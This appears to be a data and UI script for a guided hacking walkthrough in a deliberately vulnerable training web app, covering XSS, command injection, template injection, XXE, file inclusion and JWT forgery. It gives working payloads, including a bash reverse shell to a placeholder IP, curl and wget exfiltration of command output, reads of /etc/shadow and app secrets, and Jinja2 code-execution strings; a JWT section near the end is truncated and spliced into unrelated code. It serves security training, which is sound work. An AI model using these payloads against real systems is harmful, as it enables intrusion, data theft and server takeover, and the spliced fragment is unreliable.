                    <a href="/messages/send" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-envelope"></i> Send a Message</a>
                </div>`
            ]
        },
        {
            id: "xss-dom-hash",
            name: "DOM-Based XSS (News Hash)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">DOM XSS is different. The server never sees the payload. It happens entirely in the browser's JavaScript. Let's find one.</p>
                <p>Go to <a href="/news" target="_blank">News</a> and look at the page source (Ctrl+U or View Source).</p>`,

                `<p class="wt-mentor-text">Search the JavaScript code for <code>innerHTML</code>, <code>document.write</code>, or <code>eval</code>. These are "sinks" where user input can become executable code.</p>
                <p>In the news page, there is JavaScript that reads the URL hash (<code>window.location.hash</code>) and puts it into the page using <code>innerHTML</code>.</p>`,

                `<p class="wt-mentor-text">Try this URL:</p>
                <pre>/news#&lt;img src=x onerror=alert('DOM XSS')&gt;</pre>
                <p>The hash value is read by JavaScript and injected into the page without sanitization.</p>`,

                `<p class="wt-mentor-text">The alert fires. The hash fragment never gets sent to the server, so server-side filtering cannot stop this.</p>`,

                `<p class="wt-mentor-text">DOM XSS occurs when client-side JavaScript takes user-controlled data (URL hash, query params, document.referrer) and passes it to a dangerous function (innerHTML, document.write, eval). The fix is to use <code>textContent</code> instead of <code>innerHTML</code>, or sanitize the input with a library like DOMPurify.</p>`,

                `<div class="wt-try-box">
                    <a href="/news#test" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hash"></i> Go to News Page</a>
                </div>
                <p class="mt-3"><strong>Tip:</strong> DOM XSS is invisible to server-side WAFs. The payload stays in the browser.</p>`
            ]
        },
        {
            id: "xss-dom-welcome",
            name: "DOM-Based XSS (Welcome Page)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Let's practice finding DOM XSS systematically. Instead of being told where it is, let's discover it. Visit <a href="/welcome?name=YourName" target="_blank">/welcome?name=YourName</a> and open the page source (Ctrl+U).</p>
                <p>Your job: search the JavaScript on this page for dangerous functions. Use Ctrl+F in the source and search for: <code>innerHTML</code>, <code>document.write</code>, <code>eval(</code>, <code>outerHTML</code>, <code>.html(</code>.</p>`,

                `<p class="wt-mentor-text">You should find JavaScript that reads the <code>name</code> query parameter (that is the <strong>source</strong>) and passes it to <code>innerHTML</code> (that is the <strong>sink</strong>). The source-to-sink flow is the core concept of DOM XSS.</p>
                <p>In the previous DOM XSS walkthrough, the source was <code>window.location.hash</code>. Here it is a URL query parameter. Common sources to look for: <code>location.hash</code>, <code>location.search</code>, <code>location.href</code>, <code>document.referrer</code>, <code>document.URL</code>, <code>window.name</code>, and <code>postMessage</code> data.</p>`,

                `<p class="wt-mentor-text">You have identified the source and the sink. Now exploit it:</p>
                <pre>/welcome?name=&lt;img src=x onerror=alert('DOM XSS')&gt;</pre>
                <p>The query parameter value flows directly into innerHTML without any sanitization.</p>`,

                `<p class="wt-mentor-text">The alert fires. Notice that if you check the server logs, this request looks completely normal - the server just sees <code>?name=...</code> and serves the static page. All the dangerous processing happens in the browser. That is what makes DOM XSS invisible to server-side security tools.</p>`,

                `<p class="wt-mentor-text">Here is your DOM XSS hunting checklist for any page: (1) View source, search for sinks (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>outerHTML</code>, jQuery's <code>.html()</code>). (2) For each sink, trace backwards - where does the data come from? (3) If the data comes from a user-controllable source (URL, hash, referrer), test it. This source-to-sink tracing is how professional JavaScript security auditors work.</p>`,

                `<div class="wt-try-box">
                    <a href="/welcome?name=Hacker" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hand-wave"></i> Go to Welcome Page</a>
                </div>`
            ]
        },
        {
            id: "xss-stored-comment",
            name: "Stored XSS (News Comments)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Let's think about impact scale. With messages, you targeted one person. With reviews, you hit visitors to one product. Comments on news articles can reach the widest audience - everyone who reads the article.</p>
                <p>Go to <a href="/news" target="_blank">News</a>, click into any article, and scroll down to find the comment form.</p>`,

                `<p class="wt-mentor-text">Do the HTML canary test: submit a comment with <code>&lt;b&gt;bold test&lt;/b&gt;</code>. After it posts, check if "bold test" appears in bold. If yes, the comment is rendered as HTML.</p>
                <p>Important distinction: if the bold text only appears in your own browser, that might just be "self-XSS" (you are only attacking yourself). To verify it is real stored XSS, open the same article in an incognito window or a different browser. If the bold text appears there too, it is stored and affects all visitors.</p>`,

                `<p class="wt-mentor-text">Confirmed it is stored. Now post a comment with a real payload:</p>
                <pre>&lt;script&gt;alert('XSS in comments')&lt;/script&gt;</pre>
                <p>After posting, refresh the page. The alert should fire immediately. Now open that article URL in incognito - does the alert fire there too? That proves this is not self-XSS.</p>`,

                `<p class="wt-mentor-text">The alert fires for every visitor who reads this article. Unlike the message XSS (targeted, 1:1), this is a broadcast attack. If this were a popular article, hundreds of users would get hit without you doing anything after the initial comment.</p>`,

                `<p class="wt-mentor-text">The self-XSS vs stored XSS distinction matters for your report. Self-XSS (only you see it) is generally not accepted in bug bounties because you cannot attack anyone else with it. Stored XSS that fires for other users is a valid finding. Always verify by testing in a clean browser session. The "incognito test" takes five seconds and turns a rejected report into an accepted one.</p>`,

                `<div class="wt-try-box">
                    <a href="/news" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-chat-dots"></i> Go to News</a>
                </div>`
            ]
        }
    ]
},
{
    id: "cmdi",
    name: "Command Injection",
    icon: "bi-terminal",
    badgeClass: "vuln-cmdi",
    description: "Run system commands on the server through the web app.",
    vulns: [
        {
            id: "cmdi-basic-ping",
            name: "Basic Command Injection (Ping)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">When a web app runs system commands with your input, things get dangerous fast. Let's check the network tools.</p>
                <p>Go to <a href="/tools/ping" target="_blank">Tools > Ping</a>.</p>`,

                `<p class="wt-mentor-text">This tool pings an IP address. Under the hood, it is probably running something like <code>ping -c 2 YOUR_INPUT</code> on the server. If your input goes directly into a shell command, you can inject additional commands.</p>`,

                `<p class="wt-mentor-text">Try these in the host field:</p>
                <pre>127.0.0.1; whoami</pre>
                <pre>127.0.0.1 | id</pre>
                <pre>127.0.0.1 && cat /etc/passwd</pre>
                <p>The semicolon, pipe, and <code>&&</code> all chain commands in a shell.</p>`,

                `<p class="wt-mentor-text">You should see the ping output followed by the output of your injected command. <code>whoami</code> shows the server user, <code>id</code> shows groups, and <code>cat /etc/passwd</code> dumps system users.</p>`,

                `<p class="wt-mentor-text">The backend runs: <code>subprocess.check_output(f"ping -c 2 {host}", shell=True)</code></p>
                <p>The <code>shell=True</code> flag means the input is passed to a shell interpreter, which processes metacharacters like <code>;</code>, <code>|</code>, <code>&&</code>, backticks, and <code>$()</code>. The fix is to use <code>shell=False</code> with a list of arguments, or better yet, use a Python library for ping instead of shelling out.</p>`,

                `<div class="wt-try-box">
                    <a href="/tools/ping" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hdd-network"></i> Go to Ping Tool</a>
                </div>
                <p class="mt-3"><strong>Extra challenges:</strong></p>
                <ul>
                    <li>Can you get a reverse shell? Try <code>; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'</code></li>
                    <li>Read files: <code>; cat /etc/shadow</code></li>
                    <li>List directories: <code>; ls -la /</code></li>
                </ul>`
            ]
        },
        {
            id: "cmdi-filtered-dns",
            name: "Filtered Command Injection (DNS)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">What if there is a filter? Let's check the DNS lookup tool.</p>
                <p>Go to <a href="/tools/dns" target="_blank">Tools > DNS Lookup</a>.</p>`,

                `<p class="wt-mentor-text">Try the same semicolon trick: <code>google.com; whoami</code>. Does it work? The developer might have added a filter.</p>
                <p>Check what is being filtered. Semicolons might be blocked, but what about other shell metacharacters?</p>`,

                `<p class="wt-mentor-text">The filter only removes semicolons. Try these alternatives:</p>
                <pre>google.com | whoami</pre>
                <pre>google.com && whoami</pre>
                <pre>google.com || whoami</pre>
                <pre>\`whoami\`</pre>
                <pre>$(whoami)</pre>
                <p>Pipe (<code>|</code>) and <code>&&</code> are not filtered and still work.</p>`,

                `<p class="wt-mentor-text">The filter only catches one metacharacter. Your commands still execute through the other operators.</p>`,

                `<p class="wt-mentor-text">Blocklist filtering is almost always bypassable. The code does <code>domain.replace(';', '')</code> which only removes semicolons. But shell has many ways to chain commands: pipes, AND/OR operators, backticks, dollar-sign subshells, newlines. Proper fix: never pass user input to a shell. Use the <code>dnspython</code> library instead of calling <code>nslookup</code>.</p>`,

                `<div class="wt-try-box">
                    <a href="/tools/dns" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-globe"></i> Go to DNS Lookup</a>
                </div>`
            ]
        },
        {
            id: "cmdi-blind-traceroute",
            name: "Blind Command Injection (Traceroute)",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">Sometimes you can inject commands but you do not see the output. This is blind command injection. Let's check traceroute.</p>
                <p>Go to <a href="/tools/traceroute" target="_blank">Tools > Traceroute</a>.</p>`,

                `<p class="wt-mentor-text">Try <code>127.0.0.1; whoami</code>. You might see the traceroute output but not the whoami output. The app might be using a method that discards command output, or only shows the traceroute part.</p>
                <p>If you cannot see output, you need to detect the injection some other way.</p>`,

                `<p class="wt-mentor-text">Use time-based detection. If the server sleeps, you know your command executed:</p>
                <pre>127.0.0.1; sleep 5</pre>
                <p>If the response takes 5 seconds longer than normal, you have blind command injection.</p>
                <p>To exfiltrate data, use out-of-band techniques:</p>
                <pre>127.0.0.1; curl http://YOUR_SERVER/$(whoami)</pre>
                <pre>127.0.0.1; wget http://YOUR_SERVER/$(cat /etc/hostname)</pre>`,

                `<p class="wt-mentor-text">The response delay confirms command execution. For data exfiltration, check your listener for incoming requests containing the command output in the URL path.</p>`,

                `<p class="wt-mentor-text">Blind command injection is harder to detect but equally dangerous. The app uses <code>Popen</code> without capturing output, so results are invisible. Time-based and out-of-band techniques work around this. In a pentest, set up a Burp Collaborator or simple HTTP server to catch exfiltrated data.</p>`,

                `<div class="wt-try-box">
                    <a href="/tools/traceroute" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-diagram-3"></i> Go to Traceroute</a>
                </div>`
            ]
        }
    ]
},
{
    id: "ssti",
    name: "Server-Side Template Injection",
    icon: "bi-braces",
    badgeClass: "vuln-ssti",
    description: "Inject template expressions that execute on the server. Can lead to remote code execution.",
    vulns: [
        {
            id: "ssti-greeting",
            name: "SSTI in Greeting",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Template injection is like XSS but on the server side. Instead of browser JavaScript, you run server-side code. Let's find one.</p>
                <p>Go to your <a href="/profile" target="_blank">Profile</a> and look for a greeting or personalization feature. There should be a link to a greeting page.</p>`,

                `<p class="wt-mentor-text">The greeting page takes your name and renders it in a template. If the input goes directly into the template engine (Jinja2 in this case), you can inject template expressions.</p>
                <p>Try entering <code>{{7*7}}</code> as your name. If the output shows <code>49</code> instead of the literal text, you have SSTI.</p>`,

                `<p class="wt-mentor-text">First confirm with math: enter <code>{{7*7}}</code> in the greeting form.</p>
                <p>Then escalate to reading server info:</p>
                <pre>{{config}}</pre>
                <p>And for remote code execution:</p>
                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</pre>`,

                `<p class="wt-mentor-text"><code>{{7*7}}</code> returns <code>49</code>. <code>{{config}}</code> dumps the Flask config including secret keys. The RCE payload runs <code>whoami</code> on the server and returns the output.</p>`,

                `<p class="wt-mentor-text">The app uses <code>render_template_string()</code> which processes user input as a Jinja2 template. The <code>{{ }}</code> syntax is evaluated by the template engine. Through Python's object introspection, you can navigate from any object to the <code>os</code> module and execute arbitrary commands. This is full remote code execution.</p>`,

                `<div class="wt-try-box">
                    <a href="/profile/greeting" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-hand-wave"></i> Go to Greeting Page</a>
                </div>
                <p class="mt-3"><strong>Detection tip:</strong> Test <code>{{7*7}}</code> on every input. If you see <code>49</code>, you have SSTI.</p>`
            ]
        },
        {
            id: "ssti-report-gen",
            name: "SSTI in Report Generator",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Where else might templates be used? Think about features that generate dynamic output: reports, invoices, certificates, export functions. Anything that produces formatted output from user data is a potential SSTI target.</p>
                <p>Go to <a href="/reports/generate" target="_blank">Reports > Generate</a>. This feature creates reports, which almost certainly uses a template engine under the hood.</p>`,

                `<p class="wt-mentor-text">Apply the SSTI detection pattern you just learned. Enter <code>{{7*7}}</code> in whatever text field the form offers. If the generated report shows <code>49</code>, the template engine is processing your input.</p>
                <p>Also try Jinja2-specific syntax: <code>{%25 if 1 %}yes{%25 endif %}</code>. If you see "yes" in the output, that confirms Jinja2 specifically (not Twig, Mako, or another engine). Knowing the engine determines which payloads to use.</p>`,

                `<p class="wt-mentor-text">Confirmed Jinja2 SSTI. Now let's escalate differently this time - instead of running <code>whoami</code>, read the application source code:</p>
                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /opt/bugbounty/thyhe/app.py').read()}}</pre>
                <p>Or dump environment variables (often contain API keys and database credentials):</p>
                <pre>{{config.items()}}</pre>
                <p>Or list files in the app directory to find config files:</p>
                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /opt/bugbounty/thyhe/').read()}}</pre>`,

                `<p class="wt-mentor-text">You can now read the entire application source code through the report generator. The <code>config.items()</code> payload dumps the Flask configuration, which includes the <code>SECRET_KEY</code> used to sign session cookies. With that key, you can forge any session - instant admin access without needing a password.</p>`,

                `<p class="wt-mentor-text">Report generators are common in enterprise applications: HR systems generate employee reports, finance apps generate invoices, analytics tools generate dashboards. Any time you see "generate," "export," or "create report" in a business application, test for SSTI. The payload <code>{{7*7}}</code> takes two seconds to type and the impact is full remote code execution.</p>`,

                `<div class="wt-try-box">
                    <a href="/reports/generate" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-file-earmark-text"></i> Go to Report Generator</a>
                </div>`
            ]
        },
        {
            id: "ssti-email-preview",
            name: "SSTI in Email Preview",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Email templates are one of the most common SSTI targets in real-world applications. Companies let users customize notification emails, marketing campaigns, or automated responses. The preview feature renders the template so you can see what it looks like before sending. If the preview passes your input through the template engine, you have SSTI.</p>
                <p>Go to <a href="/reports/email-preview" target="_blank">Reports > Email Preview</a>.</p>`,

                `<p class="wt-mentor-text">Before jumping to <code>{{7*7}}</code>, let's explore what is available in the template context. Jinja2 templates have access to certain objects by default. Try these one at a time to see what the application exposes:</p>
                <pre>{{request}}</pre>
                <pre>{{request.headers}}</pre>
                <pre>{{session}}</pre>
                <p>These show you the current HTTP request details and session data - information that might reveal other attack vectors.</p>`,

                `<p class="wt-mentor-text">Now escalate. You have already seen the RCE payload work in the greeting and report generator. This time, use SSTI to read the application's own source code and find more vulnerabilities:</p>
                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /opt/bugbounty/thyhe/app.py | head -50').read()}}</pre>
                <p>Or find database files:</p>
                <pre>{{self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*.db" 2>/dev/null').read()}}</pre>
                <p>Reading the source code through SSTI gives you a complete map of every vulnerability in the application - SQL queries, hardcoded secrets, missing auth checks, everything.</p>`,

                `<p class="wt-mentor-text">You now have full server access through an email preview feature. The source code reveals the database path, the SECRET_KEY, and every vulnerable query. This single SSTI gives you more information than all the other vulnerabilities combined.</p>`,

                `<p class="wt-mentor-text">In real-world pentests, email template features are prime SSTI targets because: (1) they explicitly need template rendering, (2) non-technical users often control the template content (marketing teams, support teams), and (3) developers assume "it is just an email, what could go wrong?" Your takeaway: any time you see "customize," "template," "preview," or "personalize" in a feature, test for SSTI. The <code>{{7*7}}</code> probe takes two seconds, and the impact is full server compromise.</p>`,

                `<div class="wt-try-box">
                    <a href="/reports/email-preview" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-envelope"></i> Go to Email Preview</a>
                </div>`
            ]
        }
    ]
},
{
    id: "xxe",
    name: "XML External Entity (XXE)",
    icon: "bi-filetype-xml",
    badgeClass: "vuln-xxe",
    description: "Exploit XML parsers to read files and make server-side requests.",
    vulns: [
        {
            id: "xxe-import",
            name: "XXE via Report Import (Paste)",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">XXE attacks target XML parsers. If the app processes XML input and the parser resolves external entities, you can read files from the server.</p>
                <p>Go to <a href="/reports/import" target="_blank">Reports > Import</a>. There should be a text area where you can paste XML.</p>`,

                `<p class="wt-mentor-text">First, confirm the app accepts XML. Paste a simple valid XML document and submit. If it parses without error, the XML processor is active.</p>
                <p>The key question is: does the parser resolve external entities? That is what makes XXE possible.</p>`,

                `<p class="wt-mentor-text">Paste this XML:</p>
                <pre>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;report&gt;
  &lt;title&gt;&amp;xxe;&lt;/title&gt;
  &lt;content&gt;test&lt;/content&gt;
&lt;/report&gt;</pre>`,

                `<p class="wt-mentor-text">The contents of <code>/etc/passwd</code> should appear in the title field of the parsed report. The XML parser read the file from the server and substituted it into the entity.</p>`,

                `<p class="wt-mentor-text">The app uses lxml with <code>resolve_entities=True</code> and <code>load_dtd=True</code>. The <code>&lt;!ENTITY&gt;</code> declaration tells the parser to load an external resource (in this case, a local file). When the parser encounters <code>&amp;xxe;</code>, it replaces it with the file contents. You can read any file the web server process has permission to access.</p>`,

                `<div class="wt-try-box">
                    <a href="/reports/import" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-filetype-xml"></i> Go to Report Import</a>
                </div>
                <p class="mt-3"><strong>Extra challenges:</strong></p>
                <ul>
                    <li>Read <code>/etc/shadow</code> (might need root permissions)</li>
                    <li>Read app source: <code>file:///opt/bugbounty/thyhe/app.py</code></li>
                    <li>Try SSRF: use <code>http://127.0.0.1:5000/internal/admin</code> as the entity URL</li>
                </ul>`
            ]
        },
        {
            id: "xxe-upload",
            name: "XXE via XML File Upload",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Pasting XML into a text box is one thing, but file uploads are where XXE hides in the real world. Any time an application accepts XML file uploads - data imports, config uploads, report templates - the XML parser on the backend might resolve external entities.</p>
                <p>Go to <a href="/reports/import" target="_blank">Reports > Import</a> and look for the file upload option alongside the paste box.</p>`,

                `<p class="wt-mentor-text">Let's walk through creating a malicious XML file. Open a terminal and create the file:</p>
                <pre>cat > /tmp/evil.xml &lt;&lt;'EOF'
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
]&gt;
&lt;report&gt;
  &lt;title&gt;&amp;xxe;&lt;/title&gt;
  &lt;content&gt;uploaded&lt;/content&gt;
&lt;/report&gt;
EOF</pre>
                <p>The key is matching the XML structure the app expects. If it wants <code>&lt;report&gt;&lt;title&gt;&lt;content&gt;</code>, your malicious XML must follow that schema. The XXE entity declaration goes in the DOCTYPE before the document body.</p>`,

                `<p class="wt-mentor-text">Upload <code>/tmp/evil.xml</code> through the form. The server parses the XML, resolves the entity, and the hostname appears in the title field of the imported report.</p>
                <p>Now try reading something more sensitive - edit the file to target <code>file:///opt/bugbounty/thyhe/app.py</code> and re-upload. You are reading the application source code through a file upload feature.</p>`,

                `<p class="wt-mentor-text">The file contents appear in the parsed output, same as the paste-based XXE. The delivery mechanism changed (file upload vs text box), but the underlying vulnerability is identical: the XML parser resolves external entities.</p>`,

                `<p class="wt-mentor-text">Here is the key insight for your methodology: XML is everywhere, often in disguise. File formats that are secretly XML: SVG images (try uploading a malicious SVG to an avatar/image upload), DOCX/XLSX/PPTX (they are ZIP archives containing XML files - you can inject XXE into them), SOAP web services (the request body is XML), RSS/Atom feeds, and configuration files. Whenever you see a file upload, check what formats it accepts. If any format is XML-based, test for XXE.</p>`,

                `<div class="wt-try-box">
                    <a href="/reports/import" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-upload"></i> Go to Report Import</a>
                </div>`
            ]
        },
        {
            id: "xxe-api",
            name: "XXE via API Endpoint",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">APIs often accept XML. If you find an endpoint that takes XML in the request body, test it for XXE.</p>
                <p>The API has a data import endpoint at <code>/api/v1/data/import</code>.</p>`,

                `<p class="wt-mentor-text">Send an XML POST request with a Content-Type of <code>application/xml</code>. The API processes the XML body the same way as the web form.</p>`,

                `<p class="wt-mentor-text">Use curl:</p>
                <pre>curl -X POST http://localhost:5000/api/v1/data/import \\
  -H "Content-Type: application/xml" \\
  -d '&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;data&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/data&gt;'</pre>`,

                `<p class="wt-mentor-text">The API response includes the file contents. API-based XXE is the same vulnerability, just delivered via a different channel.</p>`,

                `<p class="wt-mentor-text">When testing APIs, always check if they accept XML by changing the Content-Type header to <code>application/xml</code> or <code>text/xml</code>, even if the default is JSON. Many frameworks support both formats, and the XML parser might be misconfigured even if JSON is the primary format.</p>`,

                `<div class="wt-try-box">
                    <p>Test with curl in your terminal:</p>
                    <pre>curl -X POST http://localhost:5000/api/v1/data/import -H "Content-Type: application/xml" -d '&lt;data&gt;&lt;item&gt;test&lt;/item&gt;&lt;/data&gt;'</pre>
                </div>`
            ]
        }
    ]
},
{
    id: "lfi",
    name: "File Inclusion (LFI/RFI)",
    icon: "bi-folder-symlink",
    badgeClass: "vuln-lfi",
    description: "Read files from the server or include remote files through path traversal.",
    vulns: [
        {
            id: "lfi-basic",
            name: "Basic LFI (Document Viewer)",
            difficulty: "Easy",
            steps: [
                `<p class="wt-mentor-text">Local File Inclusion lets you read files outside the intended directory. Let's check the document viewer.</p>
                <p>Go to <a href="/documents" target="_blank">Documents</a> and view one of the available files.</p>`,

                `<p class="wt-mentor-text">Look at the URL when viewing a document: <code>/documents/view?file=employee_handbook.txt</code>. That filename is being passed to the server, which reads it from a directory. What if you change the filename to point somewhere else?</p>`,

                `<p class="wt-mentor-text">Try path traversal with <code>../</code> to go up directories:</p>
                <pre>/documents/view?file=../admin_credentials.txt</pre>
                <pre>/documents/view?file=../../../../../etc/passwd</pre>
                <p>You need enough <code>../</code> to reach the target. The documents directory is nested, so you might need 4-5 levels.</p>`,

                `<p class="wt-mentor-text">You should see the contents of <code>/etc/passwd</code> or the admin credentials file. You can now read any file on the server that the web process has access to.</p>`,

                `<p class="wt-mentor-text">The app uses <code>os.path.join(DOCUMENTS_FOLDER, filename)</code> but does not validate that the resulting path stays within the intended directory. The <code>../</code> sequences traverse up the directory tree, escaping the documents folder. The fix is to check that the resolved path starts with the documents directory (using <code>os.path.realpath()</code> or similar).</p>`,

                `<div class="wt-try-box">
                    <a href="/documents" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-folder"></i> Go to Documents</a>
                </div>
                <p class="mt-3"><strong>High-value targets:</strong> <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>app.py</code> (source code), <code>.env</code>, <code>admin_credentials.txt</code></p>`,

                `<p class="wt-mentor-text">ffuf with an LFI wordlist finds readable files fast.</p>
                <pre>ffuf -u "http://localhost:5000/documents/view?file=FUZZ" \\
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\
  -H "Cookie: session=YOUR_SESSION" \\
  -mc 200 -fr "Error reading"</pre>
                <p><code>-fr "Error reading"</code> filters out responses containing that error string (files that do not exist return 200 with "Error reading file" in the body). Every response without that error is a readable file.</p>
                <p>Or build your own targeted list:</p>
                <pre>echo -e "../admin_credentials.txt\n../../../../../etc/passwd\n../../../../../etc/hostname\n../../../../../proc/self/environ" > /tmp/lfi.txt
ffuf -u "http://localhost:5000/documents/view?file=FUZZ" \\
  -w /tmp/lfi.txt \\
  -H "Cookie: session=YOUR_SESSION" \\
  -mc 200 -fr "Error reading"</pre>`
            ]
        },
        {
            id: "lfi-filter-bypass",
            name: "LFI with Filter Bypass",
            difficulty: "Medium",
            steps: [
                `<p class="wt-mentor-text">Some developers try to fix LFI by stripping <code>../</code> from the input. Let's see if their filter is any good.</p>
                <p>There is a page viewer at <code>/pages?page=</code>.</p>`,

                `<p class="wt-mentor-text">Try <code>/pages?page=../../../etc/passwd</code>. If it does not work but a normal page loads fine, there might be a filter removing the <code>../</code> sequences.</p>
                <p>The question is: does the filter run recursively (keep removing until clean) or just once?</p>`,

                `<p class="wt-mentor-text">If the filter runs only once, you can double-encode the traversal:</p>
                <pre>/pages?page=....//....//....//....//etc/passwd</pre>
                <p>When the filter removes <code>../</code> from <code>....//</code>, what is left is <code>../</code>. The filter cleaned it once but the result is still a traversal.</p>`,

                `<p class="wt-mentor-text">The file loads. The non-recursive filter is bypassed by nesting the sequences so that removing the inner one produces a new traversal.</p>`,

                `<p class="wt-mentor-text">The code does <code>page.replace('../', '')</code> which is a single-pass replacement. <code>....//</code> becomes <code>../</code> after one pass. This is why blocklist approaches fail. The secure fix is to resolve the path and check it against an allowed directory, not to try filtering malicious patterns.</p>`,

                `<div class="wt-try-box">
                    <a href="/pages?page=about" target="_blank" class="btn btn-outline-info btn-lg"><i class="bi bi-file-text"></i> Go to Page Viewer</a>
                </div>`
            ]
        },
        {
            id: "lfi-rfi",
            name: "Remote File Inclusion (RFI)",
            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">What if you can make the server load a file from your machine? That is Remote File Inclusion, and it is much more dangerous than LFI.</p>
                <p>Check the resource loader at <code>/resources?src=</code>.</p>`,

                `<p class="wt-mentor-text">Try a local file first: <code>/resources?src=employee_handbook.txt</code>. Now try a URL: <code>/resources?src=http://example.com</code>. If the server fetches external URLs, you have RFI.</p>`,

                `<p class="wt-mentor-text">Host a malicious file on your machine:</p>
                <pre>python3 -m http.server 8888</pre>
                <p>Create a file and serve it. Then:</p>
                <pre>/resources?src=http://YOUR_IP:8888/malicious.txt</pre>
                <p>For LFI, also try:</p>
                <pre>/resources?src=../../../../../etc/passwd</pre>`,

                `<p class="wt-mentor-text">The server fetches your remote file and displays its contents. If this were a PHP app, you could include a remote PHP file and get code execution. Even without code execution, you can use this for SSRF to access internal services.</p>`,

                `<p class="wt-mentor-text">The app uses <code>requests.get(resource)</code> when the source starts with <code>http</code>. This makes the server fetch any URL, which is both RFI and SSRF. For local files, it falls back to reading from the filesystem (LFI). This endpoint is a two-for-one vulnerability.</p>`,

                `<div class="wt-try-box">

            difficulty: "Hard",
            steps: [
                `<p class="wt-mentor-text">There is a classic JWT attack called "algorithm none." If the server accepts unsigned tokens, you can forge anything without knowing the secret.</p>
                <p>Get a valid JWT first (see the previous walkthrough).</p>`,

                `<p class="wt-mentor-text">Decode the JWT (it is three base64 parts separated by dots). The header is the first part. Change the <code>alg</code> field from <code>HS256</code> to <code>none</code>, modify the payload to have admin privileges, and strip the signature.</p>`,

token = jwt.encode(

    key="",
    algorithm="none"
)
print(token)</pre>

                <pre>curl http://localhost:5000/api/v1/admin/users -H "Authorization: Bearer YOUR_FORGED_TOKEN"</pre>`,

let currentCategory = null;
let currentVuln = null;
let currentStep = 0;
const STORAGE_KEY = 'thyhe-walkthrough-completed';

function getCompleted() {
    try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
    catch(e) { return []; }
}
function setCompleted(vulnId) {
    const c = getCompleted();
    if (!c.includes(vulnId)) { c.push(vulnId); localStorage.setItem(STORAGE_KEY, JSON.stringify(c)); }
}
function isCompleted(vulnId) { return getCompleted().includes(vulnId); }

function getTotalVulns() {
    let t = 0;
    WALKTHROUGH_DATA.categories.forEach(c => t += c.vulns.length);
    return t;
}

function updateOverall() {
    const completed = getCompleted();
    const total = getTotalVulns();
    let done = 0;
    WALKTHROUGH_DATA.categories.forEach(cat => {
        cat.vulns.forEach(v => { if (completed.includes(v.id)) done++; });
    });
    document.getElementById('overall-progress').textContent = done + '/' + total;
    document.getElementById('overall-progress-bar').style.width = (total ? (done/total*100) : 0) + '%';
}

function showCategories() {
    document.getElementById('view-categories').style.display = '';
    document.getElementById('view-vulns').style.display = 'none';
    document.getElementById('view-wizard').style.display = 'none';
    document.getElementById('breadcrumb-list').innerHTML = '<li class="breadcrumb-item active">Categories</li>';
    currentCategory = null;
    currentVuln = null;

    const grid = document.getElementById('category-grid');
    const completed = getCompleted();
    grid.innerHTML = '';
    WALKTHROUGH_DATA.categories.forEach(cat => {
        const done = cat.vulns.filter(v => completed.includes(v.id)).length;
        const autoCount = cat.vulns.filter(v => v.steps.length >= 7).length;
        const pct = cat.vulns.length ? (done / cat.vulns.length * 100) : 0;
        const col = document.createElement('div');
        col.className = 'col-md-4 col-lg-3';
        col.innerHTML = `
            <div class="wt-category-card" onclick="showVulns('${cat.id}')">
                <div class="category-icon ${cat.badgeClass}"><i class="bi ${cat.icon}"></i></div>
                <h5 class="mt-2 mb-1">${cat.name}</h5>
                <div class="category-count">${cat.vulns.length} vulnerabilities</div>
                <div class="wt-progress"><div class="wt-progress-bar" style="width:${pct}%"></div></div>
                <div class="category-count mt-1">${done}/${cat.vulns.length} completed</div>
                ${autoCount ? `<span class="wt-auto-badge"><i class="bi bi-robot"></i> ${autoCount} automatable</span>` : ''}
            </div>`;
        grid.appendChild(col);
    });
    updateOverall();
}

function showVulns(catId) {
    const cat = WALKTHROUGH_DATA.categories.find(c => c.id === catId);
    if (!cat) return;
    currentCategory = cat;
    document.getElementById('view-categories').style.display = 'none';
    document.getElementById('view-vulns').style.display = '';
    document.getElementById('view-wizard').style.display = 'none';
    document.getElementById('breadcrumb-list').innerHTML = `
